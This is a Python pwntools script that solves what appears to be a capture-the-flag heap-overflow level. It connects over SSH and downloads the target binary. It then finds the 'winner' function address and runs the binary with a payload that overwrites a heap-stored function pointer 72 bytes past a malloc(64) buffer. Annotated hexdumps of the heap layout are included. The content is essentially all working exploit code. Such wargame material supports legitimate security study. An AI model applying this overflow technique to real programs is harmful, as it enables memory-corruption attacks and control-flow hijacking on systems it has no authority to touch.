from pwn import *
import os.path as op

s = ssh(host=args.HOST, user=args.USER, password=args.PASS, port=int(args.PORT))

lbin = op.join('/tmp', op.basename(args.BIN))
s.download_file(args.BIN, lbin)
e = ELF(lbin)
winner_addr = e.symbols['winner']
log.info('winner_addr: %08x', winner_addr)

'''
malloc(64)
	 0x804a000  0x806b000    0x21000          0           [heap]

-> user ptr: 0x804a008 (0x804a000+0x08)
-> 8B prefix
-> dump binary memory /tmp/dump.bin 0x804a000 0x806b000
-> hexdump -C /tmp/dump.bin

                                            .-- malloc(64)
                                           v
        00000000  00 00 00 00 49 00 00 00  00 00 00 00 00 00 00 00  |....I...........|
        00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
        *
        00000040  00 00 00 00 00 00 00 00  00 00 00 00 b9 0f 02 00  |................|
                                           ^           ^^^^^^^^^^^
                                           |
                                            `-- end of malloc(64)


        00000050  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
        *
        00021000

malloc(4)
	 0x804a000  0x806b000    0x21000          0           [heap]

-> user ptr: 0x804a050 (0x804a000+0x50)
-> unchanged
-> dump binary memory /tmp/dump.bin 0x804a000 0x806b000
-> hexdump -C /tmp/dump.bin

                                            .-- malloc(64)
                                           v
        00000000  00 00 00 00 49 00 00 00  00 00 00 00 00 00 00 00  |....I...........|
        00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
        *
        00000040  00 00 00 00 00 00 00 00  00 00 00 00 11 00 00 00  |................|
                                           ^           ^^^^^^^^^^^
                                           |
                                            `-- end of malloc(64)

                   .-- malloc(4)
                  v
        00000050  00 00 00 00 00 00 00 00  00 00 00 00 a9 0f 02 00  |................|
                  =========== ^                        ^^^^^^^^^^^
                              |
                               `-- end of malloc(64)
        00000060  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
        *
        00021000

'''

payload = fit({64+4+4: p32(winner_addr)})
with s.system([args.BIN, payload]) as p:
    p.recvline()
    ret = p.recvline()
    assert ret == 'level passed\n'
